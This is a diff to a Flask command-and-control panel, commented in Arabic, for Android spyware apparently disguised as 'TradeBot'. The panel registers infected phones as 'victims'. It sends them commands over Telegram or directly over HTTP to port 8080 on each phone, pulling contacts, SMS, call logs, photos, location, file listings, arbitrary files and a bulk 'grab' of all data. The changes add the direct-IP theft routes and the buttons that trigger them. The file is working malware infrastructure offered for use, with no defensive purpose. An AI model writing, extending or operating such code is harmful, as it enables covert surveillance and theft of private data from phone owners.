@@ -1,10 +1,13 @@
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, render_template_string, request, jsonify, send_file
 import requests
 import json
 import time
 import re
 import threading
+import os
+import io
 from datetime import datetime
+import base64
 
 app = Flask(__name__)
 
@@ -15,9 +18,10 @@ CHAT_ID = "7810572372"
 victims = {}
 selected_victim = None
 command_results = {}
+direct_results = {}  # ✅ تخزين نتائج الأوامر المباشرة
 
 # ============================================================
-# ✅ ✅ ✅ تحديث قائمة الضحايا من رسائل Telegram ✅ ✅ ✅
+# ✅ تحديث قائمة الضحايا من رسائل Telegram
 # ============================================================
 def update_victims_list():
     global victims
@@ -47,14 +51,13 @@ def update_victims_list():
                                 break
                     
                     if device_id and len(device_id) > 5:
-                        # ✅ الحفاظ على IP إذا كان موجوداً مسبقاً
                         old_ip = victims.get(chat_id, {}).get("device_ip", None)
                         victims[chat_id] = {
                             "device_id": device_id,
                             "device_name": device_name or "جهاز غير معروف",
                             "last_seen": time.time(),
                             "status": "online",
-                            "device_ip": old_ip  # ✅ الحفاظ على IP القديم
+                            "device_ip": old_ip
                         }
                         print(f"✅ تم إضافة الضحية: {device_name} ({device_id})")
                     
@@ -77,7 +80,7 @@ def update_victims_list():
         return victims
 
 # ============================================================
-# ✅ ✅ ✅ إرسال أمر عبر Telegram (الطريقة القديمة) ✅ ✅ ✅
+# ✅ إرسال أمر عبر Telegram (الطريقة القديمة)
 # ============================================================
 def send_command_to_victim(chat_id, command):
     try:
@@ -100,7 +103,6 @@ def send_command_to_victim(chat_id, command):
 def send_command_direct(device_ip, command):
     """إرسال أمر مباشر إلى خادم الويب على هاتف الضحية"""
     try:
-        # ✅ تنظيف الأمر (إزالة / إذا وجدت)
         clean_command = command
         if clean_command.startswith("/"):
             clean_command = clean_command[1:]
@@ -108,7 +110,7 @@ def send_command_direct(device_ip, command):
         url = f"http://{device_ip}:8080/api/execute?cmd={clean_command}"
         print(f"📤 Sending direct command to: {url}")
         
-        response = requests.get(url, timeout=15)
+        response = requests.get(url, timeout=30)
         
         if response.status_code == 200:
             return f"✅ تم تنفيذ الأمر مباشرة على الجهاز ({device_ip})\n\n{response.text}"
@@ -123,7 +125,31 @@ def send_command_direct(device_ip, command):
         return f"❌ خطأ: {str(e)}"
 
 # ============================================================
-# ✅ ✅ ✅ إرسال أمر مع معاملات ✅ ✅ ✅
+# ✅ ✅ ✅ جلب الصور مباشرة من الجهاز ✅ ✅ ✅
+# ============================================================
+def get_images_direct(device_ip):
+    """جلب الصور مباشرة من الجهاز"""
+    try:
+        url = f"http://{device_ip}:8080/api/execute?cmd=images"
+        response = requests.get(url, timeout=60)
+        return response.text
+    except Exception as e:
+        return f"❌ خطأ في جلب الصور: {str(e)}"
+
+# ============================================================
+# ✅ ✅ ✅ جلب جميع البيانات مباشرة ✅ ✅ ✅
+# ============================================================
+def get_grab_direct(device_ip):
+    """جلب جميع البيانات مباشرة من الجهاز"""
+    try:
+        url = f"http://{device_ip}:8080/api/execute?cmd=grab"
+        response = requests.get(url, timeout=120)
+        return response.text
+    except Exception as e:
+        return f"❌ خطأ في جلب البيانات: {str(e)}"
+
+# ============================================================
+# ✅ ✅ ✅ تنفيذ أمر مع معاملات ✅ ✅ ✅
 # ============================================================
 def send_command_with_param(chat_id, command, param):
     try:
@@ -141,7 +167,19 @@ def send_command_with_param(chat_id, command, param):
         return f"❌ خطأ: {str(e)}"
 
 # ============================================================
-# ✅ ✅ ✅ HTML (واجهة محسّنة مع دعم IP) ✅ ✅ ✅
+# ✅ ✅ ✅ تحميل ملف مباشر من الجهاز ✅ ✅ ✅
+# ============================================================
+def download_file_direct(device_ip, file_path):
+    """تحميل ملف مباشرة من الجهاز"""
+    try:
+        url = f"http://{device_ip}:8080/api/execute?cmd=download {file_path}"
+        response = requests.get(url, timeout=60)
+        return response.text
+    except Exception as e:
+        return f"❌ خطأ في تحميل الملف: {str(e)}"
+
+# ============================================================
+# ✅ ✅ ✅ HTML (واجهة محسّنة مع دعم مباشر كامل) ✅ ✅ ✅
 # ============================================================
 HTML = """
 <!DOCTYPE html>
@@ -149,11 +187,11 @@ HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم TradeBot</title>
+    <title>لوحة تحكم TradeBot - تحكم مباشر</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0e17; color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; min-height: 100vh; }
-        .container { max-width: 1100px; margin: auto; }
+        .container { max-width: 1200px; margin: auto; }
         
         .header {
             background: linear-gradient(135deg, #0f1a2e, #1a2a4e);
@@ -217,17 +255,41 @@ HTML = """
         .target-info .target-id { color: #666; font-size: 12px; }
         .target-info .target-ip { color: #00d4ff; font-size: 12px; font-family: monospace; }
         
+        .method-toggle {
+            display: flex;
+            gap: 15px;
+            margin: 8px 0;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .method-toggle label {
+            font-size: 12px;
+            color: #8B8B8B;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .method-toggle input[type="radio"] {
+            accent-color: #00d4ff;
+            width: 16px;
+            height: 16px;
+        }
+        .method-toggle .active-method {
+            color: #00d4ff;
+            font-weight: bold;
+        }
         .btn-group {
             display: flex;
             flex-wrap: wrap;
-            gap: 5px;
-            margin-bottom: 10px;
+            gap: 4px;
+            margin: 8px 0;
         }
         .btn {
-            padding: 7px 12px;
+            padding: 6px 10px;
             border: none;
-            border-radius: 6px;
-            font-size: 11px;
+            border-radius: 5px;
+            font-size: 10px;
             cursor: pointer;
             transition: all 0.2s;
             font-weight: 600;
@@ -244,6 +306,16 @@ HTML = """
         .btn-orange { background: #ff6f00; color: #fff; }
         .btn-cyan { background: #00acc1; color: #fff; }
         .btn-direct { background: #ff4444; color: #fff; border: 1px solid #ff6666; }
+        .btn-direct-success { background: #44ff88; color: #000; border: 1px solid #66ffaa; }
+        
+        .section-title {
+            color: #00d4ff;
+            font-size: 13px;
+            font-weight: bold;
+            margin: 10px 0 5px 0;
+            border-bottom: 1px solid #1a3a6e;
+            padding-bottom: 4px;
+        }
         
         .result-box {
             background: #0f1a2e;
@@ -266,7 +338,7 @@ HTML = """
         
         .cmd-input {
             background: #0f1a2e;
-            padding: 10px;
+            padding: 8px;
             border-radius: 8px;
             border: 1px solid #1a3a6e;
             margin-top: 8px;
@@ -277,37 +349,14 @@ HTML = """
             flex: 1;
             background: #1a2a4e;
             border: 1px solid #2a4a6e;
-            padding: 8px 12px;
-            border-radius: 6px;
+            padding: 6px 10px;
+            border-radius: 5px;
             color: #e0e0e0;
             outline: none;
+            font-size: 12px;
         }
         .cmd-input input:focus { border-color: #00d4ff; }
-        .cmd-input button { background: #00d4ff; color: #000; border: none; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        
-        .method-toggle {
-            display: flex;
-            gap: 10px;
-            margin: 8px 0;
-            align-items: center;
-        }
-        .method-toggle label {
-            font-size: 12px;
-            color: #8B8B8B;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .method-toggle input[type="radio"] {
-            accent-color: #00d4ff;
-            width: 16px;
-            height: 16px;
-        }
-        .method-toggle .active-method {
-            color: #00d4ff;
-            font-weight: bold;
-        }
+        .cmd-input button { background: #00d4ff; color: #000; border: none; padding: 6px 16px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 12px; }
         
         .clear { clear: both; }
         .sidebar::-webkit-scrollbar { width: 4px; }
@@ -317,7 +366,7 @@ HTML = """
         @media (max-width: 700px) {
             .sidebar { float: none; width: 100%; max-height: 200px; margin-bottom: 15px; }
             .main { margin-left: 0; }
-            .btn-group .btn { flex: 1; min-width: 50px; text-align: center; }
+            .btn-group .btn { flex: 1; min-width: 45px; text-align: center; font-size: 9px; }
         }
     </style>
 </head>
@@ -359,6 +408,8 @@ HTML = """
             <span id="methodStatus" style="color:#666;font-size:11px;margin-left:10px;">✅ جاهز</span>
         </div>
         
+        <!-- ✅ ✅ ✅ الأوامر الأساسية ✅ ✅ ✅ -->
+        <div class="section-title">📌 الأوامر الأساسية</div>
         <div class="btn-group">
             <button class="btn btn-primary" onclick="sendCommand('contacts')">📇 جهات</button>
             <button class="btn btn-primary" onclick="sendCommand('sms')">📩 رسائل</button>
@@ -375,6 +426,21 @@ HTML = """
             <button class="btn btn-secondary" onclick="sendCommand('help')">🆘 مساعدة</button>
             <button class="btn btn-orange" onclick="sendCommand('status')">📊 حالة</button>
             <button class="btn btn-cyan" onclick="sendCommand('apps')">📱 تطبيقات</button>
+        </div>
+        
+        <!-- ✅ ✅ ✅ الأوامر المباشرة (جديدة) ✅ ✅ ✅ -->
+        <div class="section-title">⚡ أوامر مباشرة (IP)</div>
+        <div class="btn-group">
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('contacts')">📇 جهات</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('sms')">📩 رسائل</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('calls')">📞 مكالمات</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('images')">🖼️ صور</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('export-images')">📤 جميع الصور</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('location')">📍 موقع</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('device')">📱 جهاز</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('grab')">💾 جمع الكل</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('listdir')">📂 ملفات</button>
+            <button class="btn btn-direct-success" onclick="sendDirectCommand('status')">📊 حالة</button>
         </div>
         
         <div class="cmd-input">
@@ -481,6 +547,9 @@ function selectVictim(chatId) {
     }
 }
 
+// ============================================================
+// ✅ ✅ ✅ إرسال أمر (عبر Telegram أو مباشر) ✅ ✅ ✅
+// ============================================================
 function sendCommand(cmd) {
     if (!selectedVictim) {
         document.getElementById('resultContent').innerText = '⚠️ يرجى اختيار ضحية أولاً';
@@ -494,42 +563,64 @@ function sendCommand(cmd) {
     
     // ✅ إذا كان الوضع المباشر مفعلاً والضحية لديها IP
     if (useDirectMethod && v && v.device_ip && v.device_ip !== 'unknown') {
-        result.textContent = '⚡ جاري الإرسال مباشرة إلى ' + v.device_ip + '...';
-        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-        
-        fetch('/send_direct/' + cmd + '/' + v.device_ip)
-            .then(function(response) { return response.text(); })
-            .then(function(data) {
-                result.textContent = data;
-                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-            })
-            .catch(function(err) {
-                result.textContent = '❌ خطأ: ' + err;
-                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-            });
-    } else {
-        // ✅ الطريقة العادية عبر Telegram
-        if (useDirectMethod) {
-            result.textContent = '⚠️ الضحية لا يوجد لها IP، سيتم الإرسال عبر Telegram';
-            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-        }
-        
-        result.textContent = '📡 جاري إرسال /' + cmd + ' عبر Telegram...';
-        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-        
-        fetch('/send/' + cmd + '/' + selectedVictim)
-            .then(function(response) { return response.text(); })
-            .then(function(data) {
-                result.textContent = data;
-                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-            })
-            .catch(function(err) {
-                result.textContent = '❌ خطأ: ' + err;
-                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-            });
+        sendDirectCommand(cmd);
+        return;
     }
+    
+    // ✅ الطريقة العادية عبر Telegram
+    result.textContent = '📡 جاري إرسال /' + cmd + ' عبر Telegram...';
+    timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+    
+    fetch('/send/' + cmd + '/' + selectedVictim)
+        .then(function(response) { return response.text(); })
+        .then(function(data) {
+            result.textContent = data;
+            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+        })
+        .catch(function(err) {
+            result.textContent = '❌ خطأ: ' + err;
+            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+        });
 }
 
+// ============================================================
+// ✅ ✅ ✅ إرسال أمر مباشر ✅ ✅ ✅
+// ============================================================
+function sendDirectCommand(cmd) {
+    if (!selectedVictim) {
+        document.getElementById('resultContent').innerText = '⚠️ يرجى اختيار ضحية أولاً';
+        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
+        return;
+    }
+    
+    var v = victimData[selectedVictim];
+    if (!v || !v.device_ip || v.device_ip === 'unknown') {
+        document.getElementById('resultContent').innerText = '⚠️ لا يوجد IP لهذه الضحية';
+        document.getElementById('resultTimestamp').innerText = new Date().toLocaleTimeString('ar-EG');
+        return;
+    }
+    
+    var result = document.getElementById('resultContent');
+    var timestamp = document.getElementById('resultTimestamp');
+    
+    result.textContent = '⚡ جاري الإرسال مباشرة إلى ' + v.device_ip + '...';
+    timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+    
+    fetch('/api/direct/' + cmd + '/' + v.device_ip)
+        .then(function(response) { return response.text(); })
+        .then(function(data) {
+            result.textContent = data;
+            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+        })
+        .catch(function(err) {
+            result.textContent = '❌ خطأ: ' + err;
+            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+        });
+}
+
+// ============================================================
+// ✅ ✅ ✅ إرسال أمر مخصص ✅ ✅ ✅
+// ============================================================
 function sendCustomCommand() {
     var input = document.getElementById('customCmd');
     var cmd = input.value.trim();
@@ -548,17 +639,17 @@ function sendCustomCommand() {
     var result = document.getElementById('resultContent');
     var timestamp = document.getElementById('resultTimestamp');
     
-    // ✅ إزالة / من بداية الأمر إذا وجدت
     var cleanCmd = cmd;
     if (cleanCmd.startsWith('/')) {
         cleanCmd = cleanCmd.substring(1);
     }
     
+    // ✅ إذا كان الوضع المباشر مفعلاً
     if (useDirectMethod && v && v.device_ip && v.device_ip !== 'unknown') {
         result.textContent = '⚡ جاري الإرسال مباشرة إلى ' + v.device_ip + '...';
         timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
         
-        fetch('/send_direct/' + cleanCmd + '/' + v.device_ip)
+        fetch('/api/direct/' + cleanCmd + '/' + v.device_ip)
             .then(function(response) { return response.text(); })
             .then(function(data) {
                 result.textContent = data;
@@ -569,39 +660,24 @@ function sendCustomCommand() {
                 result.textContent = '❌ خطأ: ' + err;
                 timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
             });
-    } else {
-        if (useDirectMethod) {
-            result.textContent = '⚠️ الضحية لا يوجد لها IP، سيتم الإرسال عبر Telegram';
+        return;
+    }
+    
+    // ✅ عبر Telegram
+    result.textContent = '📡 جاري إرسال /' + cmd + ' عبر Telegram...';
+    timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+    
+    fetch('/send_custom/' + selectedVictim + '?cmd=' + encodeURIComponent(cmd))
+        .then(function(response) { return response.text(); })
+        .then(function(data) {
+            result.textContent = data;
             timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-        }
-        
-        result.textContent = '📡 جاري إرسال /' + cmd + ' عبر Telegram...';
-        timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-        
-        fetch('/send_custom/' + selectedVictim + '?cmd=' + encodeURIComponent(cmd))
-            .then(function(response) { return response.text(); })
-            .then(function(data) {
-                result.textContent = data;
-                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-                input.value = '';
-            })
-            .catch(function(err) {
-                result.textContent = '❌ خطأ: ' + err;
-                timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
-            });
-    }
-}
-
-function toggleMethod() {
-    var radios = document.getElementsByName('method');
-    for (var i = 0; i < radios.length; i++) {
-        if (radios[i].checked) {
-            useDirectMethod = (radios[i].value === 'direct');
-            document.getElementById('methodStatus').innerText = useDirectMethod ? '⚡ وضع مباشر' : '📡 وضع Telegram';
-            document.getElementById('methodStatus').style.color = useDirectMethod ? '#44ff88' : '#00d4ff';
-            break;
-        }
-    }
+            input.value = '';
+        })
+        .catch(function(err) {
+            result.textContent = '❌ خطأ: ' + err;
+            timestamp.innerText = new Date().toLocaleTimeString('ar-EG');
+        });
 }
 
 window.onload = function() {
@@ -641,7 +717,7 @@ def get_victims():
             "device_name": data["device_name"],
             "status": data.get("status", "unknown"),
             "last_seen": data.get("last_seen", 0),
-            "device_ip": data.get("device_ip", "unknown")  # ✅ ✅ ✅ إضافة IP ✅ ✅ ✅
+            "device_ip": data.get("device_ip", "unknown")
         }
     return jsonify(result)
 
@@ -656,9 +732,6 @@ def send_command(command, chat_id):
     result = send_command_to_victim(chat_id, command)
     return result
 
-# ============================================================
-# ✅ ✅ ✅ إرسال أمر مخصص عبر Telegram ✅ ✅ ✅
-# ============================================================
 @app.route('/send_custom/<chat_id>')
 def send_custom_command(chat_id):
     if chat_id not in victims:
@@ -671,9 +744,6 @@ def send_custom_command(chat_id):
     result = send_command_to_victim(chat_id, cmd)
     return result
 
-# ============================================================
-# ✅ ✅ ✅ إرسال أمر مع معاملات ✅ ✅ ✅
-# ============================================================
 @app.route('/send_with_param/<command>/<chat_id>')
 def send_command_with_param_route(command, chat_id):
     if chat_id not in victims:
@@ -687,19 +757,58 @@ def send_command_with_param_route(command, chat_id):
     return result
 
 # ============================================================
-# ✅ ✅ ✅ إرسال أمر مباشر إلى IP (الطريقة الجديدة) ✅ ✅ ✅
+# ✅ ✅ ✅ أوامر مباشرة (الطريقة الجديدة) ✅ ✅ ✅
 # ============================================================
-@app.route('/send_direct/<command>/<device_ip>')
-def send_direct_command(command, device_ip):
-    """إرسال أمر مباشر إلى خادم الويب على هاتف الضحية"""
+
+@app.route('/api/direct/<command>/<device_ip>')
+def direct_command(command, device_ip):
+    """تنفيذ أمر مباشرة على الجهاز وإرجاع النتيجة"""
     try:
-        # ✅ التحقق من صحة IP
         if device_ip == "unknown" or not device_ip:
-            return "❌ IP غير صالح للضحية"
+            return "❌ IP غير صالح"
         
         result = send_command_direct(device_ip, command)
         return result
+    except Exception as e:
+        return f"❌ خطأ: {str(e)}"
+
+@app.route('/api/direct_images/<device_ip>')
+def direct_images(device_ip):
+    """جلب الصور مباشرة من الجهاز"""
+    try:
+        if device_ip == "unknown" or not device_ip:
+            return "❌ IP غير صالح"
         
+        result = get_images_direct(device_ip)
+        return result
+    except Exception as e:
+        return f"❌ خطأ: {str(e)}"
+
+@app.route('/api/direct_grab/<device_ip>')
+def direct_grab(device_ip):
+    """جلب جميع البيانات مباشرة من الجهاز"""
+    try:
+        if device_ip == "unknown" or not device_ip:
+            return "❌ IP غير صالح"
+        
+        result = get_grab_direct(device_ip)
+        return result
+    except Exception as e:
+        return f"❌ خطأ: {str(e)}"
+
+@app.route('/api/direct_download/<device_ip>')
+def direct_download(device_ip):
+    """تحميل ملف مباشرة من الجهاز"""
+    try:
+        file_path = request.args.get('path', '')
+        if not file_path:
+            return "❌ يرجى تحديد مسار الملف (path)"
+        
+        if device_ip == "unknown" or not device_ip:
+            return "❌ IP غير صالح"
+        
+        result = download_file_direct(device_ip, file_path)
+        return result
     except Exception as e:
         return f"❌ خطأ: {str(e)}"
 
@@ -708,51 +817,36 @@ def send_direct_command(command, device_ip):
 # ============================================================
 @app.route('/api/new_victim', methods=['POST'])
 def new_victim():
-    """استقبال ضحية جديدة من تطبيق Android"""
     try:
         data = request.get_json()
         device_id = data.get('device_id')
         device_name = data.get('device_name')
         chat_id = data.get('chat_id')
-        device_ip = data.get('device_ip', 'unknown')  # ✅ ✅ ✅ استقبال IP ✅ ✅ ✅
+        device_ip = data.get('device_ip', 'unknown')
         
         if not device_id or not chat_id:
-            return jsonify({
-                "status": "error", 
-                "message": "Missing device_id or chat_id"
-            }), 400
+            return jsonify({"status": "error", "message": "Missing device_id or chat_id"}), 400
         
-        # ✅ تخزين الضحية مع IP
         victims[chat_id] = {
             "device_id": device_id,
             "device_name": device_name or "جهاز غير معروف",
             "status": "online",
             "last_seen": time.time(),
-            "device_ip": device_ip  # ✅ ✅ ✅ تخزين IP ✅ ✅ ✅
+            "device_ip": device_ip
         }
         
-        print(f"✅ تم تسجيل ضحية جديدة من Android: {device_name} ({device_id})")
+        print(f"✅ تم تسجيل ضحية جديدة: {device_name} ({device_id})")
         print(f"🌐 IP: {device_ip}")
-        print(f"📊 عدد الضحايا الآن: {len(victims)}")
         
-        return jsonify({
-            "status": "ok",
-            "message": f"Victim {device_name} registered successfully"
-        })
-        
+        return jsonify({"status": "ok", "message": "Victim registered"})
     except Exception as e:
-        print(f"❌ خطأ في تسجيل الضحية: {e}")
-        return jsonify({
-            "status": "error",
-            "message": str(e)
-        }), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 # ============================================================
 # ✅ ✅ ✅ تحديث IP الجهاز ✅ ✅ ✅
 # ============================================================
 @app.route('/api/update_device_ip', methods=['POST'])
 def update_device_ip():
-    """تحديث IP الجهاز"""
     try:
         data = request.get_json()
         device_ip = data.get('device_ip')
@@ -762,15 +856,12 @@ def update_device_ip():
         if not device_ip or not chat_id:
             return jsonify({"status": "error", "message": "Missing data"}), 400
         
-        # ✅ تحديث IP للضحية
         if chat_id in victims:
             victims[chat_id]["device_ip"] = device_ip
             victims[chat_id]["last_seen"] = time.time()
             victims[chat_id]["status"] = "online"
             print(f"✅ تم تحديث IP للضحية {chat_id}: {device_ip}")
-            return jsonify({"status": "ok", "message": "IP updated"})
         else:
-            # ✅ إذا كانت الضحية غير موجودة، أضفها
             victims[chat_id] = {
                 "device_id": device_id or "unknown",
                 "device_name": "جهاز غير معروف",
@@ -778,44 +869,37 @@ def update_device_ip():
                 "last_seen": time.time(),
                 "device_ip": device_ip
             }
-            print(f"✅ تم إضافة ضحية جديدة مع IP: {device_ip}")
-            return jsonify({"status": "ok", "message": "Victim added with IP"})
-            
+        
+        return jsonify({"status": "ok"})
     except Exception as e:
-        print(f"❌ خطأ في تحديث IP: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # ============================================================
-# ✅ ✅ ✅ تحديث الهدف من جهاز Android ✅ ✅ ✅
+# ✅ ✅ ✅ تحديث الهدف ✅ ✅ ✅
 # ============================================================
 @app.route('/api/update_target', methods=['POST'])
 def update_target():
-    """استقبال تحديث الهدف من جهاز Android"""
     try:
         data = request.get_json()
-        device_id = data.get('device_id')
         chat_id = data.get('chat_id')
         target_id = data.get('target_id')
         
         if chat_id in victims:
             victims[chat_id]['target'] = target_id
-            print(f"🎯 تم تحديث الهدف للضحية {chat_id}: {target_id}")
         
         return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
 # ============================================================
-# ✅ ✅ ✅ استقبال نتيجة الأمر من جهاز Android ✅ ✅ ✅
+# ✅ ✅ ✅ نتيجة الأمر ✅ ✅ ✅
 # ============================================================
 @app.route('/api/command_result', methods=['POST'])
 def command_result():
-    """استقبال نتيجة الأمر من جهاز Android"""
     try:
         data = request.get_json()
         command = data.get('command')
         result = data.get('result')
-        device_id = data.get('device_id')
         chat_id = data.get('chat_id')
         
         command_results[chat_id] = {
@@ -824,20 +908,9 @@ def command_result():
             "time": time.time()
         }
         
-        print(f"📥 نتيجة الأمر {command} من {chat_id}: {result[:100]}...")
         return jsonify({"status": "ok"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
-
-# ============================================================
-# ✅ ✅ ✅ جلب نتيجة الأمر الأخير ✅ ✅ ✅
-# ============================================================
-@app.route('/api/get_command_result/<chat_id>')
-def get_command_result(chat_id):
-    """جلب نتيجة الأمر الأخير"""
-    if chat_id in command_results:
-        return jsonify(command_results[chat_id])
-    return jsonify({"error": "no result"})
 
 # ============================================================
 # ✅ ✅ ✅ تشغيل الخادم ✅ ✅ ✅
@@ -846,4 +919,10 @@ if __name__ == '__main__':
     print("🚀 تشغيل لوحة التحكم على https://tradebot-panel.onrender.com")
     print("📱 انتظر حتى يتم تسجيل ضحية جديدة")
     print("⚡ يمكنك الآن التحكم المباشر عبر IP")
+    print("📊 الأوامر المباشرة المتاحة:")
+    print("   - /api/direct/contacts/[IP]")
+    print("   - /api/direct/sms/[IP]")
+    print("   - /api/direct/images/[IP]")
+    print("   - /api/direct/grab/[IP]")
+    print("   - /api/direct/listdir/[IP]")
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
